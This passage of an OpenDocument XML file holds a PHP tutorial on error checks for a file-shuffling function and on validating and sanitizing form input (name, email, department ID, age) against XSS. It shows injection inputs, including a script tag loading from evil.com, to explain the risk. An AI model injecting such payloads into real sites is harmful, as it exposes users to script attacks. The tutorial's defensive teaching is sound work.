      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T135">$shuffledContents </text:span><text:span text:style-name="T168">= implode(</text:span><text:span text:style-name="T140">""</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T135">$lines</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T168">file_put_contents(</text:span><text:span text:style-name="T135">$filename</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T135">$shuffledContents</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T144">return </text:span><text:span text:style-name="T168">count(</text:span><text:span text:style-name="T135">$lines</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P82">}<text:bookmark-end text:name="__DdeLink__1947_379528241"/></text:p>
      <text:p text:style-name="P120"/>
      <text:p text:style-name="P14"><text:span text:style-name="T31"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1949_379528241"/><text:span text:style-name="T37">T</text:span><text:span text:style-name="T40">h</text:span><text:span text:style-name="T37">at one is much more better. But it still has few obvious vulnerabilities connected with working with file system. Let</text:span><text:span text:style-name="T39">'</text:span><text:span text:style-name="T37">s add some verifications to control the success of execution of this brick of code.</text:span><text:bookmark-end text:name="__DdeLink__1949_379528241"/></text:p>
      <text:p text:style-name="P68"><text:bookmark-start text:name="__DdeLink__1951_379528241"/><text:span text:style-name="T84">function </text:span><text:span text:style-name="T117">shuffleFile</text:span><text:span text:style-name="T41">(string </text:span><text:span text:style-name="T99">$filename</text:span><text:span text:style-name="T41">): int</text:span></text:p>
      <text:p text:style-name="P65">{</text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T144">false </text:span><text:span text:style-name="T168">=== </text:span><text:span text:style-name="T135">$lines </text:span><text:span text:style-name="T168">= file(</text:span><text:span text:style-name="T135">$filename</text:span><text:span text:style-name="T168">)) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="8"/></text:span><text:span text:style-name="T144">return </text:span><text:span text:style-name="T168">-</text:span><text:span text:style-name="T162">1</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T168">}</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T168">shuffle(</text:span><text:span text:style-name="T135">$lines</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T135">$shuffledContents </text:span><text:span text:style-name="T168">= implode(</text:span><text:span text:style-name="T140">""</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T135">$lines</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T144">false </text:span><text:span text:style-name="T168">=== file_put_contents(</text:span><text:span text:style-name="T135">$filename</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T135">$shuffledContents</text:span><text:span text:style-name="T168">)) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="8"/></text:span><text:span text:style-name="T144">return </text:span><text:span text:style-name="T168">-</text:span><text:span text:style-name="T162">1</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T168">}</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T144">return </text:span><text:span text:style-name="T168">count(</text:span><text:span text:style-name="T135">$lines</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P82">}<text:bookmark-end text:name="__DdeLink__1951_379528241"/></text:p>
      <text:p text:style-name="P15"><text:soft-page-break/><text:span text:style-name="T37"><text:tab/></text:span><text:span text:style-name="T31">Much better. Now we can check the success of execution our part of code after call and react the way we want.</text:span></text:p>
      <text:p text:style-name="P98"><text:span text:style-name="T31"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__1964_379528241"/><text:span text:style-name="T38">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40">e</text:span><text:span text:style-name="T38">n process it and after that you return tham. This way is more wide-spread, </text:span><text:span text:style-name="T40">predictable</text:span><text:span text:style-name="T38"> and maybe even safe. But the second way is better in case you are working with a huge data volume or call the function really often: you don</text:span><text:span text:style-name="T39">'</text:span><text:span text:style-name="T38">t create and contain enormous count of data that</text:span><text:span text:style-name="T39">'</text:span><text:span text:style-name="T38">s why it works faster.</text:span><text:bookmark-end text:name="__DdeLink__1964_379528241"/></text:p>
      <text:p text:style-name="P98"><text:span text:style-name="T38"/></text:p>
      <text:p text:style-name="P99"><text:span text:style-name="T38">4.</text:span><text:span text:style-name="T31">Forms Processing</text:span></text:p>
      <text:p text:style-name="P100"><text:span text:style-name="T44"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__2535_1458108310"/><text:span text:style-name="T44">Integral part of the majority of serious web-sites are forms and form processing. Good form should look simple and clear. That is a front end team issue. And concerning the back end part of a project th</text:span><text:span text:style-name="T45">e</text:span><text:span text:style-name="T44">re should be lots of job. </text:span><text:span text:style-name="T43">Besides the processing of correct user input variables and </text:span><text:span text:style-name="T45">interaction with a database it is necessary to protect source from so called «malicious scripts»: XSS</text:span><text:span text:style-name="T43"> attacs (HTML and JS injections), SQL injections and other attacs which can be directed on </text:span><text:span text:style-name="T45">stealing</text:span><text:span text:style-name="T43"> the passwords, private information, virus scripts </text:span><text:span text:style-name="T45">spread</text:span><text:span text:style-name="T43"> and even just </text:span><text:span text:style-name="T45">destroying</text:span><text:span text:style-name="T43"> the database. Such disasters can move from one source to another so it is really important to set the sanitation behind each form.</text:span><text:bookmark-end text:name="__DdeLink__2535_1458108310"/></text:p>
      <text:p text:style-name="P119"><text:span text:style-name="T43"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__2562_1458108310"/><text:span text:style-name="T46">I</text:span><text:span text:style-name="T58">'</text:span><text:span text:style-name="T46">m using Twig template engine in this project which has default html-entities shielting. That</text:span><text:span text:style-name="T58">'</text:span><text:span text:style-name="T46">s why for demonstration I display parameters with «raw» filter. </text:span><text:span text:style-name="T51">Also in the form above there is a regular expression checking up in Department id input. This thing is really useful and simple sometimes.</text:span><text:bookmark-end text:name="__DdeLink__2562_1458108310"/></text:p>
      <text:p text:style-name="P126"><text:bookmark-start text:name="__DdeLink__2548_1458108310"/><text:span text:style-name="T89">private const </text:span><text:span text:style-name="T107">NAME_INVALID_MESSAGE </text:span><text:span text:style-name="T66">= </text:span><text:span text:style-name="T113">"Name should contain only english letters."</text:span><text:span text:style-name="T94">;</text:span></text:p>
      <text:p text:style-name="P122"><text:span text:style-name="T86">private function </text:span><text:span text:style-name="T120">processName</text:span><text:span text:style-name="T63">(?string </text:span><text:span text:style-name="T102">$name</text:span><text:span text:style-name="T63">): </text:span><text:span text:style-name="T86">array</text:span></text:p>
      <text:p text:style-name="P65">{</text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T135">$processedNameArray </text:span><text:span text:style-name="T168">= []</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T144">isset</text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T135">$name</text:span><text:span text:style-name="T168">)) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="8"/></text:span><text:span text:style-name="T135">$processedNameArray</text:span><text:span text:style-name="T168">[] = !</text:span><text:span text:style-name="T144">empty</text:span><text:span text:style-name="T168">(trim(</text:span><text:span text:style-name="T135">$name</text:span><text:span text:style-name="T168">)) ? </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">RAW </text:span><text:span text:style-name="T168">. </text:span><text:span text:style-name="T135">$name </text:span><text:span text:style-name="T168">: </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">RAW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35">$isValid </text:span><text:span text:style-name="T168">= ctype_alpha(</text:span><text:span text:style-name="T135">$name</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T135">$processedNameArray</text:span><text:span text:style-name="T168">[] = (</text:span><text:span text:style-name="T135">$isValid</text:span><text:span text:style-name="T168">) ? </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">VALID_MESSAGE </text:span><text:span text:style-name="T168">: </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">NAME_INVALID_MESSAGE</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(!</text:span><text:span text:style-name="T144">empty</text:span><text:span text:style-name="T168">(trim(</text:span><text:span text:style-name="T135">$name</text:span><text:span text:style-name="T168">))) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="12"/></text:span><text:span text:style-name="T135">$processedNameArray</text:span><text:span text:style-name="T168">[] = </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">SANITIZED </text:span><text:span text:style-name="T168">. filter_var(</text:span><text:span text:style-name="T135">$name</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T136">FILTER_SANITIZE_STRING</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T168">} </text:span><text:span text:style-name="T144">else </text:span><text:span text:style-name="T168">{</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="12"/></text:span><text:span text:style-name="T135">$processedNameArray</text:span><text:span text:style-name="T168">[] = </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">SANITIZED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68">}</text:span></text:p>
      <text:p text:style-name="P69"><text:s text:c="4"/><text:span text:style-name="T167">}</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T144">return </text:span><text:span text:style-name="T135">$processedNameArray</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P127"><text:span text:style-name="T146">}</text:span><text:bookmark-end text:name="__DdeLink__2548_1458108310"/></text:p>
      <text:list xml:id="list7557040296369185940" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P102"><text:bookmark-start text:name="__DdeLink__2591_1458108310"/><text:span text:style-name="T47">When working with POST check up, is there a POST value with this key. In this method I</text:span><text:span text:style-name="T58">'</text:span><text:span text:style-name="T47">m getting something like $_POST[</text:span><text:span text:style-name="T59">'name'</text:span><text:span text:style-name="T47">] but it</text:span><text:span text:style-name="T58">'</text:span><text:span text:style-name="T47">s possible that there wasn</text:span><text:span text:style-name="T58">'</text:span><text:span text:style-name="T47">t such name attribute value on a form input or someone changed something.</text:span><text:bookmark-end text:name="__DdeLink__2591_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P102"><text:bookmark-start text:name="__DdeLink__2593_1458108310"/><text:soft-page-break/><text:span text:style-name="T47">Than I</text:span><text:span text:style-name="T58">'</text:span><text:span text:style-name="T47">m just displaying raw data. Without any validation. What can go wrong?) You are writing your name like «</text:span><text:span text:style-name="T59">Michael</text:span><text:span text:style-name="T47">» and everything works?) Well try to write this way: «&lt;b&gt;</text:span><text:span text:style-name="T59">Michael</text:span><text:span text:style-name="T47">&lt;/b&gt;». As you can see you have just entered the inner structure of the page and this is what really unacceptable. Write this way «&lt;input type=“text“ name=“id“ placeholder=security_hole&gt;». </text:span><text:span text:style-name="T48">I can not even imagine how much damage you can make via this newborn input. </text:span><text:span text:style-name="T49">There you can also </text:span><text:span text:style-name="T50">put smth like «</text:span><text:span text:style-name="T124">&lt;</text:span><text:span text:style-name="T125">script</text:span><text:span text:style-name="T124"> </text:span><text:span text:style-name="T126">src</text:span><text:span text:style-name="T124">=</text:span><text:span text:style-name="T127">"http://evil.com/dangerous.js"</text:span><text:span text:style-name="T124"> </text:span><text:span text:style-name="T126">type</text:span><text:span text:style-name="T124">=</text:span><text:span text:style-name="T127">"text/javascript"</text:span><text:span text:style-name="T124"> </text:span><text:span text:style-name="T126">charset</text:span><text:span text:style-name="T124">=</text:span><text:span text:style-name="T127">"utf-8"</text:span><text:span text:style-name="T124">&gt;&lt;/</text:span><text:span text:style-name="T125">script</text:span><text:span text:style-name="T124">&gt;</text:span><text:span text:style-name="T50">». I don</text:span><text:span text:style-name="T58">'</text:span><text:span text:style-name="T50">t need to explain.</text:span><text:bookmark-end text:name="__DdeLink__2593_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P103"><text:bookmark-start text:name="__DdeLink__2595_1458108310"/><text:span text:style-name="T50">T</text:span><text:span text:style-name="T42">han I</text:span><text:span text:style-name="T58">'</text:span><text:span text:style-name="T42">m checking up the input data format with a help of «ctype» family m</text:span><text:span text:style-name="T60">e</text:span><text:span text:style-name="T42">meber ctype_alpha which admits only english alphabet letters. You can also use this smart function-group to check only numbers, only numbers and digits, only upper and only lower letters and few more things.</text:span><text:bookmark-end text:name="__DdeLink__2595_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P101"><text:bookmark-start text:name="__DdeLink__2597_1458108310"/><text:span text:style-name="T52">And finally I display shielted data with a help of built-in function filter_var and an suitable key which blocks any html-entity and danger symbol. In case you want to process something more simple than name like email there are some keys for it.</text:span><text:bookmark-end text:name="__DdeLink__2597_1458108310"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P104"><text:span text:style-name="T52"/></text:p>
      <text:p text:style-name="P123"><text:bookmark-start text:name="__DdeLink__2550_1458108310"/><text:span text:style-name="T87">private const </text:span><text:span text:style-name="T108">EMAIL_INVALID_MESSAGE </text:span><text:span text:style-name="T64">= </text:span><text:span text:style-name="T114">"Email should have postfix."</text:span><text:span text:style-name="T95">;</text:span></text:p>
      <text:p text:style-name="P123"><text:span text:style-name="T87">private function </text:span><text:span text:style-name="T121">processEmail</text:span><text:span text:style-name="T64">(?string </text:span><text:span text:style-name="T103">$email</text:span><text:span text:style-name="T64">): </text:span><text:span text:style-name="T87">array</text:span></text:p>
      <text:p text:style-name="P65">{</text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T135">$processedEmailArray </text:span><text:span text:style-name="T168">= []</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T144">isset</text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T135">$email</text:span><text:span text:style-name="T168">)) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="8"/></text:span><text:span text:style-name="T135">$processedEmailArray</text:span><text:span text:style-name="T168">[] = !</text:span><text:span text:style-name="T144">empty</text:span><text:span text:style-name="T168">(trim(</text:span><text:span text:style-name="T135">$email</text:span><text:span text:style-name="T168">)) ? </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">RAW </text:span><text:span text:style-name="T168">. </text:span><text:span text:style-name="T135">$email </text:span><text:span text:style-name="T168">: </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">RAW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35">$isValid </text:span><text:span text:style-name="T168">= filter_input(</text:span><text:span text:style-name="T136">INPUT_POST</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T140">"email"</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T136">FILTER_VALIDATE_EMAIL</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T135">$processedEmailArray</text:span><text:span text:style-name="T168">[] = (</text:span><text:span text:style-name="T135">$isValid</text:span><text:span text:style-name="T168">) ? </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">VALID_MESSAGE </text:span><text:span text:style-name="T168">: </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">EMAIL_INVALID_MESSAGE</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(!</text:span><text:span text:style-name="T144">empty</text:span><text:span text:style-name="T168">(trim(</text:span><text:span text:style-name="T135">$email</text:span><text:span text:style-name="T168">))) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="12"/></text:span><text:span text:style-name="T135">$processedEmailArray</text:span><text:span text:style-name="T168">[] = </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">SANITIZED </text:span><text:span text:style-name="T168">. filter_var(</text:span><text:span text:style-name="T135">$email</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T136">FILTER_SANITIZE_EMAIL</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T168">} </text:span><text:span text:style-name="T144">else </text:span><text:span text:style-name="T168">{</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="12"/></text:span><text:span text:style-name="T135">$processedEmailArray</text:span><text:span text:style-name="T168">[] = </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">SANITIZED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68">}</text:span></text:p>
      <text:p text:style-name="P69"><text:s text:c="4"/><text:span text:style-name="T167">}</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T144">return </text:span><text:span text:style-name="T135">$processedEmailArray</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P82">}<text:bookmark-end text:name="__DdeLink__2550_1458108310"/></text:p>
      <text:p text:style-name="P104"><text:span text:style-name="T52"/></text:p>
      <text:list xml:id="list6368603511056466850" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P105"><text:bookmark-start text:name="__DdeLink__2599_1458108310"/><text:span text:style-name="T47">C</text:span><text:span text:style-name="T42">hecking up the existence and displaying raw data.</text:span><text:bookmark-end text:name="__DdeLink__2599_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P106"><text:bookmark-start text:name="__DdeLink__2601_1458108310"/><text:span text:style-name="T42">Checking up the format via filter_input() and a special key. Need to notice that I</text:span><text:span text:style-name="T58">'</text:span><text:span text:style-name="T42">ve </text:span><text:span text:style-name="T60">already</text:span><text:span text:style-name="T42"> checked the format of email via html input attribute type «email» but that was not enough because without inner validation via filter_input email «</text:span><text:a xlink:type="simple" xlink:href="mailto:myemail@email" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">myemail@email</text:a><text:span text:style-name="T42">» would be correct </text:span><text:span text:style-name="T53">although it has no postfix.</text:span><text:bookmark-end text:name="__DdeLink__2601_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P109"><text:bookmark-start text:name="__DdeLink__2603_1458108310"/><text:span text:style-name="T53">I </text:span><text:span text:style-name="T42">diplay safe data with filter_var() function and a special key I was talking about above.</text:span><text:bookmark-end text:name="__DdeLink__2603_1458108310"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P121"><text:bookmark-start text:name="__DdeLink__2552_1458108310"/><text:span text:style-name="T92">private const </text:span><text:span text:style-name="T110">DEPARTMENT_ID_INVALID_MESSAGE </text:span><text:span text:style-name="T92">= </text:span><text:span text:style-name="T116">"There are only A-C departments now."</text:span><text:span text:style-name="T92">;</text:span></text:p>
      <text:p text:style-name="P121"><text:span text:style-name="T92">private function </text:span><text:span text:style-name="T123">processDepartmentId</text:span><text:span text:style-name="T92">(?string </text:span><text:span text:style-name="T105">$id</text:span><text:span text:style-name="T92">): array</text:span></text:p>
      <text:p text:style-name="P65"><text:soft-page-break/>{</text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T135">$processedIdArray </text:span><text:span text:style-name="T168">= []</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T144">isset</text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T135">$id</text:span><text:span text:style-name="T168">)) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="8"/></text:span><text:span text:style-name="T135">$processedIdArray</text:span><text:span text:style-name="T168">[] = !</text:span><text:span text:style-name="T144">empty</text:span><text:span text:style-name="T168">(trim(</text:span><text:span text:style-name="T135">$id</text:span><text:span text:style-name="T168">)) ? </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">RAW </text:span><text:span text:style-name="T168">. </text:span><text:span text:style-name="T135">$id </text:span><text:span text:style-name="T168">: </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">RAW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35">$isValid </text:span><text:span text:style-name="T168">= preg_match(</text:span><text:span text:style-name="T140">"/[A-C]-([0-9]){3,3}/"</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T135">$id</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T135">$processedIdArray</text:span><text:span text:style-name="T168">[] = (</text:span><text:span text:style-name="T135">$isValid</text:span><text:span text:style-name="T168">) ? </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">VALID_MESSAGE </text:span><text:span text:style-name="T168">: </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">DEPARTMENT_ID_INVALID_MESSAGE</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(!</text:span><text:span text:style-name="T144">empty</text:span><text:span text:style-name="T168">(trim(</text:span><text:span text:style-name="T135">$id</text:span><text:span text:style-name="T168">))) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="12"/></text:span><text:span text:style-name="T135">$processedIdArray</text:span><text:span text:style-name="T168">[] = </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">SANITIZED </text:span><text:span text:style-name="T168">. filter_var(</text:span><text:span text:style-name="T135">$id</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T136">FILTER_SANITIZE_STRING</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T168">} </text:span><text:span text:style-name="T144">else </text:span><text:span text:style-name="T168">{</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="12"/></text:span><text:span text:style-name="T135">$processedIdArray</text:span><text:span text:style-name="T168">[] = </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">SANITIZED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68">}</text:span></text:p>
      <text:p text:style-name="P69"><text:s text:c="4"/><text:span text:style-name="T167">}</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T144">return </text:span><text:span text:style-name="T135">$processedIdArray</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P82">}<text:bookmark-end text:name="__DdeLink__2552_1458108310"/></text:p>
      <text:p text:style-name="P121"><text:span text:style-name="T85"/></text:p>
      <text:list xml:id="list3463274790791104519" text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P107"><text:bookmark-start text:name="__DdeLink__2605_1458108310"/><text:span text:style-name="T47">C</text:span><text:span text:style-name="T42">hecking up the existence and displaying raw data.</text:span><text:bookmark-end text:name="__DdeLink__2605_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P110"><text:bookmark-start text:name="__DdeLink__2607_1458108310"/><text:span text:style-name="T42">Checking up the data via regular expression. For example main format for company identifier is up</text:span><text:span text:style-name="T60">p</text:span><text:span text:style-name="T42">ercase letter, hyphen and three numbers. But on the current moment there are on</text:span><text:span text:style-name="T60">l</text:span><text:span text:style-name="T42">y departments starting with from A to C letters. You can check such things with a help of regular expression but should remember that thay are much slower than built-in format checking functions or for example checking up with usual </text:span><text:span text:style-name="T54">incorruptible check by casting type :)</text:span><text:bookmark-end text:name="__DdeLink__2607_1458108310"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P124"><text:bookmark-start text:name="__DdeLink__2554_1458108310"/><text:span text:style-name="T88">private const </text:span><text:span text:style-name="T109">AGE_INVALID_MESSAGE </text:span><text:span text:style-name="T65">= </text:span><text:span text:style-name="T115">"Age must be a number."</text:span><text:span text:style-name="T96">;</text:span></text:p>
      <text:p text:style-name="P124"><text:span text:style-name="T88">private function </text:span><text:span text:style-name="T122">processAge</text:span><text:span text:style-name="T65">(?string </text:span><text:span text:style-name="T104">$age</text:span><text:span text:style-name="T65">): </text:span><text:span text:style-name="T88">array</text:span></text:p>
      <text:p text:style-name="P65">{</text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T135">$processedAgeArray </text:span><text:span text:style-name="T168">= []</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T144">isset</text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T135">$age</text:span><text:span text:style-name="T168">)) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="8"/></text:span><text:span text:style-name="T135">$processedAgeArray</text:span><text:span text:style-name="T168">[] = !</text:span><text:span text:style-name="T144">empty</text:span><text:span text:style-name="T168">(trim(</text:span><text:span text:style-name="T135">$age</text:span><text:span text:style-name="T168">)) ? </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">RAW </text:span><text:span text:style-name="T168">. </text:span><text:span text:style-name="T135">$age </text:span><text:span text:style-name="T168">: </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">RAW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35">$isValid </text:span><text:span text:style-name="T168">= ctype_digit(</text:span><text:span text:style-name="T135">$age</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T135">$processedAgeArray</text:span><text:span text:style-name="T168">[] = (</text:span><text:span text:style-name="T135">$isValid</text:span><text:span text:style-name="T168">) ? </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">VALID_MESSAGE </text:span><text:span text:style-name="T168">: </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">AGE_INVALID_MESSAGE</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(!</text:span><text:span text:style-name="T144">empty</text:span><text:span text:style-name="T168">(trim(</text:span><text:span text:style-name="T135">$age</text:span><text:span text:style-name="T168">))) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="12"/></text:span><text:span text:style-name="T135">$processedAgeArray</text:span><text:span text:style-name="T168">[] =</text:span></text:p>
